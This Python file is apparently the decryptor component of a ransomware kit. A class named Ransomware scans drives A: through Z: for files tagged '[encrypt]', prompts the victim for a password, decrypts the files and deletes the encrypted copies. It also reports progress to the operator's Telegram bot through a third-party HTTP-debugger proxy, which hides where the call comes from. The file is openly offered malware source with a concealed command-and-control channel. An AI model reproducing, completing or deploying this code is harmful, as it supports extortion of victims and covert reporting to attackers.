from pyAesCrypt import decryptFile
from os import walk , path, remove
from requests import post , get
import tkinter as tk
from tkinter import simpledialog, messagebox

class Ransomware(object):

    def __init__(self):
        self.KEY = ''# Generate Random Key For Encrypt
        self.CHAT_ID = 'chat id telegram (int)'
        self.TOKEN = 'TOKEN-BOT'
        self.DRIVE = ('A:','C:','B:','D:','E:','F:','G:','H:','I:',
                        'J:','K:','L:','M:','N:','O:','P:','Q:',
                            'R:','S:','T:','U:','V:','W:','X:','Y:','Z:')
        self.EXCLUDE_DIRECTORY = (
                            #Windows system directorys
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$RECYCLE.BIN',
                            'AppData',
                            'logs',)  

    def find_files(self):
        list_files_ = []
        for drive_target in self.DRIVE:
            for  root,dirs,files in walk(drive_target,topdown = False):
                for name in files:
                    if any(EXCLUDE in name for EXCLUDE in self.EXCLUDE_DIRECTORY) or any(EXCLUDE in root for EXCLUDE in self.EXCLUDE_DIRECTORY):
                        pass
                    else:
                        if path.isdir(path.join(root,name)):
                            pass
                        elif '[encrypt]' not in path.join(root,name):
                            pass
                        else:
                             list_files_.append(path.join(root,name))   
                for name in dirs:
                    if any(EXCLUDE in name for EXCLUDE in self.EXCLUDE_DIRECTORY) or any(EXCLUDE in root for EXCLUDE in self.EXCLUDE_DIRECTORY):
                        pass
                    else:
                        if path.isdir(path.join(root,name)):
                            pass
                        elif '[encrypt]' not in path.join(root,name):
                            pass
                        else:    
                            list_files_.append(path.join(root,name))

        return list_files_                

    def send_to_telegram(self, token, caht_id , text):
        try:
            url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={caht_id}&text={text}'

            deta = {
                'UrlBox': url,
                'AgentList': 'Mozilla Firefox',
                'VersionsList': ' HTTP/1.1',
                'MethodList': 'GET'
            }
            re = post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx', data=deta)
        except:
            pass
    def get_password(self):
        root = tk.Tk()
        root.withdraw()
        user_input = simpledialog.askstring(title="x0Crypt0",
                                        prompt="Enter The Password :")

        self.KEY = user_input

    def decrypter(self,filenames):
        if self.KEY == '':
            messagebox.showwarning("Warning","Wrong password !")
            exit()
        try:
            for files in filenames:
                decryptFile(files,files.replace('[encrypt]',''),self.KEY)
                remove(files)
        except:
            messagebox.showwarning("Warning","Wrong password !")
            exit()



    def main(self):
        self.get_password()
        filenames = self.find_files()
        self.send_to_telegram(self.TOKEN,self.CHAT_ID , 'Start decrypting files !')
        self.decrypter(filenames)
        self.send_to_telegram(self.TOKEN,self.CHAT_ID , 'Finish decrypting files !')


f = Ransomware()
f.main()
